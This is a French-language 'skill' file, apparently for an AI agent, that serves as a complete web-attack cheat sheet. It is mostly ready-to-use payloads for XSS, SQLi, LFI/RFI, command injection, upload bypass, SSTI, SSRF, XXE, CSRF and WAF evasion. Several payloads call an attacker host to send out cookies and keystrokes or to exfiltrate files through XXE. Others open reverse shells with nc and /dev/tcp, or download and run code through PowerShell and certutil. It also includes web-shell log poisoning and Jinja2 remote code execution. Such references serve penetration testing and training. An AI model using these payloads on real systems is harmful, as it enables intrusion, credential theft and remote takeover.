---
name: web-attacks
description: Guide complet des attaques web — XSS, CSRF, SSTI, LFI/RFI, command injection, SQLi avancé, file upload bypass, XXE, IDOR, SSRF, et techniques de contournement WAF.
---

# Attaques Web — Guide Complet

---

## 1. XSS (Cross-Site Scripting)

### Types
| Type | Description | Impact |
|------|-------------|--------|
| **Reflected** | Payload dans la réponse immédiate | Vol de cookie, phishing |
| **Stored** | Payload stocké en base | Permanent, tous les visiteurs |
| **DOM-based** | Injection côté client JS | Contourne WAF |

### Payloads XSS classiques
```html
<script>alert(1)</script>
<script>fetch('http://attacker/?c='+document.cookie)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onload=alert(1)>
<iframe src="javascript:alert(1)">
<details open ontoggle=alert(1)>

<!-- Vol de cookie -->
<script>new Image().src='http://10.0.0.5:8888/?c='+document.cookie</script>

<!-- Keylogger -->
<script>document.onkeypress=function(e){fetch('http://10.0.0.5:8888/?k='+e.key)}</script>
```

### Contournement de filtres
```html
<!-- Si <script> bloqué -->
<img src=x onerror="&#x61;lert(1)">
<svg><animate onbegin=alert(1) attributeName=x dur=1s>

<!-- Si espace bloqué -->
<img/src=x/onerror=alert(1)>

<!-- Si () bloqués -->
<img src=x onerror=alert`1`>
```

---

## 2. SQLi (Injection SQL)

### Tests de base
```sql
' OR '1'='1
' OR 1=1--
admin' --
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT 1,2,3--
```

### Exploitation avancée (sqlmap)
```bash
# Voir la skill outils-pentest pour sqlmap complet

# Requêtes manuelles utiles :
' UNION SELECT table_name,NULL FROM information_schema.tables--
' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users'--
' UNION SELECT username,password FROM users--
```

### Second-order SQLi
- Injection stockée en base, exécutée plus tard
- Non détectable en réponse directe
- Tester toutes les entrées qui seront réutilisées

---

## 3. LFI / RFI (File Inclusion)

### LFI (Local File Inclusion)
```bash
# Tests de base
?page=../../../../etc/passwd
?page=/etc/passwd
?page=....//....//....//etc/passwd
?page=..%252f..%252f..%252fetc/passwd       # Double URL encoding
?page=%2e%2e%2f%2e%2e%2fetc%2fpasswd       # URL encoding complet

# PHP wrappers
?page=php://filter/convert.base64-encode/resource=index.php
?page=php://filter/read=convert.base64-encode/resource=config.php
?page=expect://whoami                         # Si expect activé
?page=data://text/plain,<?php system('whoami');?>

# Log poisoning (si logs accessibles)
# 1. Injecter <?php system($_GET['cmd']);?> dans User-Agent
# 2. Inclure le fichier de log
?page=/var/log/apache2/access.log&cmd=whoami
```

### RFI (Remote File Inclusion)
```bash
# Si allow_url_include=On
?page=http://10.0.0.5/shell.txt
?page=ftp://10.0.0.5/shell.txt
```

---

## 4. Command Injection

### OS Command Injection
```bash
# Tests
| whoami
; whoami
|| whoami
&& whoami
`whoami`
$(whoami)

# Linux
; nc 10.0.0.5 4444 -e /bin/bash
| bash -i >& /dev/tcp/10.0.0.5/4444 0>&1

# Windows
| powershell -c "IEX(New-Object Net.WebClient).DownloadString('http://10.0.0.5/rev.ps1')"
& certutil -urlcache -split -f http://10.0.0.5/nc.exe C:\temp\nc.exe
```

---

## 5. File Upload Bypass

### Contournement de vérifications
```bash
# Extension blacklist
shell.php  → shell.pHP5, shell.php., shell.php%00, shell.pHp
shell.php  → shell.php.jpg  (double extension)
shell.php  → shell.PhP (casse)

# Content-Type bypass
# Changer Content-Type: application/x-php → image/jpeg

# Magic bytes
# Ajouter en début de fichier :
# PNG :  89 50 4E 47
# JPEG : FF D8 FF E0
# GIF :  GIF89a;

# .htaccess upload
# Uploader un .htaccess :
# AddType application/x-httpd-php .jpg
# Puis uploader shell.jpg → exécuté comme PHP
```

---

## 6. SSTI (Server-Side Template Injection)

### Détection
```python
{{7*7}}              # Jinja2/Twig → 49
${7*7}               # Freemarker
<%= 7*7 %>           # ERB
#{7*7}               # Pug/Jade
{{= 7*7 }}           # Mojolicious
${{7*7}}             # Django (rare)
```

### Exploitation Jinja2 (Flask)
```python
# Lecture de fichier
{{ ''.__class__.__mro__[1].__subclasses__() }}
{{ config }}
{{ get_flashed_messages.__globals__.__builtins__.open('/etc/passwd').read() }}

# RCE Jinja2
{% for x in ().__class__.__base__.__subclasses__() %}
{% if "warning" in x.__name__ %}
{{x()._module.__builtins__['__import__']('os').popen('id').read()}}
{% endif %}
{% endfor %}
```

---

## 7. SSRF (Server-Side Request Forgery)

```bash
# Tests
?url=http://localhost/admin
?url=http://127.0.0.1:8080
?url=http://169.254.169.254/latest/meta-data/    # AWS metadata
?url=http://[::1]:80                               # IPv6 localhost
?url=http://0x7f000001/                            # Hex encoding
?url=http://2130706433/                            # Decimal encoding
?url=file:///etc/passwd

# Cloud metadata
# AWS : http://169.254.169.254/latest/meta-data/
# GCP : http://metadata.google.internal/
# Azure : http://169.254.169.254/metadata/instance
```

---

## 8. XXE (XML External Entity)

```xml
<!-- XXE Classique -->
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>&xxe;</root>

<!-- XXE OOB (Out-of-Band) -->
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://10.0.0.5/evil.dtd">
  %xxe;
]>

<!-- evil.dtd (sur serveur attaquant) -->
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://10.0.0.5/?data=%file;'>">
%eval;
```

---

## 9. CSRF (Cross-Site Request Forgery)

```html
<!-- PoC HTML -->
<html>
<body>
<form action="http://cible.com/change-password" method="POST">
<input type="hidden" name="new_password" value="hacked">
<input type="submit" value="Submit">
</form>
<script>document.forms[0].submit();</script>
</body>
</html>
```

---

## 10. IDOR (Insecure Direct Object Reference)

```bash
# Tests
GET /user/profile/1
GET /user/profile/2           # Accéder à un autre profil ?
GET /invoice/2024/001.pdf
GET /invoice/2024/002.pdf     # Accéder à une autre facture ?

# IDOR + GUID non prédictibles
# Chercher les endpoints qui exposent des IDs dans d'autres sources
# (JS, API publique, emails, partages...)
```

---

## 11. Contournement WAF générique

```bash
# SQLi
SELECT → SeLeCt, sel%00ect, /*!50000SELECT*/
' OR '1'='1 → ' OR 0x31=0x31
UNION SELECT → UNION/**/SELECT

# XSS
<script> → <scr<script>ipt>
alert() → alert``, prompt``, confirm``
onerror → onerror%0a

# Path traversal
../ → ....//, ..%252f..%252f, ..%c0%af
```

---

## Cheatsheet rapide

```
==========================================
XSS : <img src=x onerror=alert(1)>
SSTI : {{7*7}}
LFI  : ?page=../../../../etc/passwd
SQLi : ' OR '1'='1'--
CMDi : ; whoami
SSRF : ?url=http://169.254.169.254/
XXE  : <!ENTITY xxe SYSTEM "file:///etc/passwd">
IDOR : Changer l'ID dans l'URL
==========================================
```

### Ressources
- **OWASP Testing Guide** : https://owasp.org/www-project-web-security-testing-guide/
- **PayloadsAllTheThings** : https://github.com/swisskyrepo/PayloadsAllTheThings
- **HackTricks** : https://book.hacktricks.xyz
- **XSS Cheat Sheet** : https://portswigger.net/web-security/cross-site-scripting/cheat-sheet